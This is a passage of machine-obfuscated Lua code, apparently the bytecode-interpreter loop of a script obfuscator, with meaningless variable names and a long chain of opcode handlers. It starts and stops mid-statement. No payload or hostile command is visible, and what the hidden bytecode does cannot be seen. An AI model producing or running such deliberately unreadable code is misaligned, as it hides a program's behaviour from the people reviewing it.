A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];end;elseif c<=16 then if c>15 then if e[o[2]]then d=d+1;else d=d+o[3];end;else local d=o[2];local l={};local o=d+o[3]-1;for o=d+1,o do l[#l+1]=e[o];end;do return e[d](r(l,1,o-d))end;end;elseif c<=17 then local D;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];elseif c==18 then e[o[2]]=-e[o[3]];else local A;local D,A;local c;local A;local C;local a;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];a=o[2];C={};A=0;c=a+o[3]-1;for o=a+1,c do A=A+1;C[A]=e[o];end;D,c=J(e[a](r(C,1,c-a)));c=c+a-1;A=0;for o=a,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];a=o[2];C={};A=0;c=B;for o=a+1,c do A=A+1;C[A]=e[o];end;D={e[a](r(C,1,c-a))};c=a+o[5]-2;A=0;for o=a,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];end;elseif c<=29 then if c<=24 then if c<=21 then if c==20 then local A;local D,A;local c;local A;local C;local a;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];a=o[2];C={};A=0;c=a+o[3]-1;for o=a+1,c do A=A+1;C[A]=e[o];end;D,c=J(e[a](r(C,1,c-a)));c=c+a-1;A=0;for o=a,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];a=o[2];C={};A=0;c=B;for o=a+1,c do A=A+1;C[A]=e[o];end;D={e[a](r(C,1,c-a))};c=a+o[5]-2;A=0;for o=a,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];a=o[2];C={};A=0;c=a+o[3]-1;for o=a+1,c do A=A+1;C[A]=e[o];end;D,c=J(e[a](r(C,1,c-a)));c=c+a-1;A=0;for o=a,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];a=o[2];C={};A=0;c=B;for o=a+1,c do A=A+1;C[A]=e[o];end;D={e[a](r(C,1,c-a))};c=a+o[5]-2;A=0;for o=a,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];a=o[2];C={};A=0;c=a+o[3]-1;for o=a+1,c do A=A+1;C[A]=e[o];end;D={e[a](r(C,1,c-a))};c=a+o[5]-2;A=0;for o=a,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];a=o[2];C={};A=0;c=a+o[3]-1;for o=a+1,c do A=A+1;C[A]=e[o];end;D={e[a](r(C,1,c-a))};c=a+o[5]-2;A=0;for o=a,c do A=A+1;e[o]=D[A];end;B=c;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];d=d+o[3];else e[o[2]][e[o[3]]]=e[o[5]];end;elseif c<=22 then if(e[o[2]]~=n[o[5]])then d=d+1;else d=d+o[3];end;elseif c>23 then e[o[2]]=e[o[3]]-n[o[5]];else local l=o[2];local f={};local d=0;local n=l+o[3]-1;for o=l+1,n do d=d+1;f[d]=e[o];end;local n={e[l](r(f,1,n-l))};local o=l+o[5]-2;d=0;for o=l,o do d=d+1;e[o]=n[d];end;B=o;end;elseif c<=26 then if c==25 then e[o[2]]=e[o[3]];else local D;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;end;elseif c<=27 then local C;local c;local f;local a;local A;e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];A=o[2];a={};f=0;c=A+o[3]-1;for o=A+1,c do f=f+1;a[f]=e[o];end;C={e[A](r(a,1,c-A))};c=A+o[5]-2;f=0;for o=A,c do f=f+1;e[o]=C[f];end;B=c;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=(o[3]~=0);d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];elseif c==28 then local A,A;local D;local a;local A;local C;local c;c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];c=o[2];D,a={e[c]()};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];c=o[2];D,a={e[c]()};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=(o[3]~=0);d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=(o[3]~=0);d=d+1;o=l[d];e[o[2]]=(o[3]~=0);d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];f[n[o[3]]]=e[o[2]];else local A,A;local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];c=o[2];D,a={e[c]()};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=e[o[3]]+e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];end;elseif c<=34 then if c<=31 then if c>30 then e[o[2]]=(o[3]~=0);else local D;local a;local A;local C;local c;e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];end;elseif c<=32 then if(e[o[2]]==e[o[5]])then d=d+1;else d=d+o[3];end;elseif c==33 then e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]][e[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];else local D;local a;local c;local C;local A;A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;e[A](r(C,1,a-A));B=A;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=(o[3]~=0);d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];A=o[2];C={};c=0;a=A+o[3]-1;for o=A+1,a do c=c+1;C[c]=e[o];end;D={e[A](r(C,1,a-A))};a=A+o[5]-2;c=0;for o=A,a do c=c+1;e[o]=D[c];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=n[o[5]];end;elseif c<=37 then if c<=35 then local D;local a;local A;local C;local c;e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];elseif c==36 then local d=o[2];local l=e[o[3]];e[d+1]=l;e[d]=l[n[o[5]]];else e[o[2]]=n[o[3]]+e[o[5]];end;elseif c<=38 then local D;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];elseif c==39 then local D;local a;local A;local C;local c;e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];c=o[2];C={};A=0;a=c+o[3]-1;for o=c+1,a do A=A+1;C[A]=e[o];end;D={e[c](r(C,1,a-c))};a=c+o[5]-2;A=0;for o=c,a do A=A+1;e[o]=D[A];end;B=a;d=d+1;o=l[d];e[o[2]][n[o[3]]]=e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=n[o[3]];else e[o[2]]=n[o[3]]+e[o[5]];end;elseif c<=61 then if c<=50 then if c<=45 then if c<=42 then if c==41 then e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]]/e[o[5]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=n[o[3]];d=d+1;o=l[d];e[o[2]]=e[o[3]][e[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]];else e[o[2]]=e[o[3]]/n[o[5]];end;elseif c<=43 then e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=f[n[o[3]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];e[o[2]]=e[o[3]][n[o[5]]];d=d+1;o=l[d];if(e[o[2]]==e[o[5]])then d=d+1;else d=d+o[3];end;elseif c==44 then if(e[o[2]]>=e[o[5]])then d=d+1;else d=d+o[3];end;else local a;local A;local n;local c;local f;f=o[2];c={};n=0;A=f+o[3]-1;for o=f+1,A do n=n+1;c[n]=e[o];end;a={e[f](r(c,1,A-f))};A=f+o[5]-2;n=0;for o=f,A do n=n+1;e[o]=a[n];end;B=A;d=d+1;o=l[d];e[o[2]]=-e[o[3]];d=d+1;o=l[d];f=o[2];c={};n=0;A=f+o[3]-1;for o=f+1,A do n=n+1;c[n]=e[o];end;a={e[f](r(c,1,A-f))};A=f+o[5]-2;n=0;for o=f,A do n=n+1;e[o]=a[n];end;B=A;d=d+1;o=l[d];e[o[2]]=e[o[3]]*e[o[5]];d=d+1;o=l[d];d=d+o[3];end;elseif c<=47 then if c>46 then local C;local c;local f;local a;local 